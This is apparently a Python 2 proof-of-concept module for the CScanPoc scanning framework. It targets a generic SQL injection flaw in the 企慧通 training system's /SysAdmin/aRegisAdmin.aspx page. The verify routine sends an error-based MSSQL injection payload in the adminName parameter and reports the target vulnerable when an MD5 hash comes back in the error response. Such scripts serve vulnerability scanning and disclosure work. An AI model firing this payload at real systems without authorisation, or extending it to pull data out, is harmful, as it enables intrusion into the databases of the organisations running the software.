# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'QHT_0002' # 平台漏洞编号，留空
    name = '企慧通培训系统通用型SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-10-29'  # 漏洞公布时间
    desc = '''
        深圳市企慧通培训系统通用型SQL注入漏洞：
        /SysAdmin/aRegisAdmin.aspx?type=regisAdmin&clientid=adminName&adminName=admin
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0129326
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = '企慧通培训系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '79c423b3-eace-4c32-ae23-a6becbfc9194'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            p = "/SysAdmin/aRegisAdmin.aspx?type=regisAdmin&clientid=adminName&adminName=admin'%20and%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))>0--"
            url = arg + p 
            code2, head, res, errcode, _ = hh.http(url )
            
            if (code2 ==500) and ('0x81dc9bdb52d04dc20036dbd8313ed055' in res): 
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()